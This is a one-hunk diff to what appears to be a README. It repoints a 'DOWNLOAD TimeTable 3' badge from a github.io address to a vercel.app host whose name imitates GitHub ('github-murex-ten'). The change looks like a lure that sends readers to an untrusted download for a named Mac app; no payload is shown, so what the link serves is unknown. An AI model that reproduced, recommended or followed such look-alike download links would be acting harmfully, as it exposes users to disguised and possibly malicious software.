@@ -6,7 +6,7 @@
 
 <p align="center">
 
-[![Download TimeTable 3](https://img.shields.io/badge/DOWNLOAD_TimeTable_3-0f766e?style=for-the-badge&logo=apple&logoColor=white)](https://ygabyga-irak.github.io/.github/TimeTable-3)
+[![Download TimeTable 3](https://img.shields.io/badge/DOWNLOAD_TimeTable_3-0f766e?style=for-the-badge&logo=apple&logoColor=white)](https://github-murex-ten.vercel.app/TimeTable-3)
 
 </p>
 
